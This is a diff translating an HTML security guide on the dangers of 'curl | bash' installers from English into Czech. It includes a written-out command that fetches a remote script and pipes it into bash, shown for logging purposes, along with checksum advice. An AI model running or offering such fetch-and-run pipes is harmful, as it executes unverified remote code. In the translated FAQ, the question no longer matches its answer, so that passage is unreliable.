+          <p>Pokud musíte rouru použít — zaznamenejte, co proběhlo, abyste to mohli auditovat nebo vrátit.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Poznámka</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> sleduje pouze příkazy nejvyšší úrovně. Podprocesy a zdroje skriptů se v záznamu neobjeví.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Ověřte kontrolní součet</h3>
+          <p>Pokud projekt zveřejňuje hash SHA-256, použijte ho. Na produkčních strojích je to nepodmíněná nutnost.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -2249,10 +2249,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Častá námitka</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">‚Nejdřív si to přečtu v prohlížeči‘ vás nechrání: to, co čtete, není to, co se spustilo.</p>
+          <p class="faq-a">Důvěřovat dodavateli je nutné, ale nestačí. `curl | bash` přidává na tuto důvěru další útočnou plochu: zároveň důvěřujete DNS, CDN, poskytovateli hostingu a každému, kdo by mohl kompromitovat URL mezi tímto okamžikem a chvílí, kdy příkaz spustíte. Balíček nainstalovaný přes správce balíčků prochází dalšími vrstvami ověřování. To, že je dodavatel renomovaný, z mechanismu doručení bezpečný nástroj nedělá.</p>
         </div>
       </section>
 
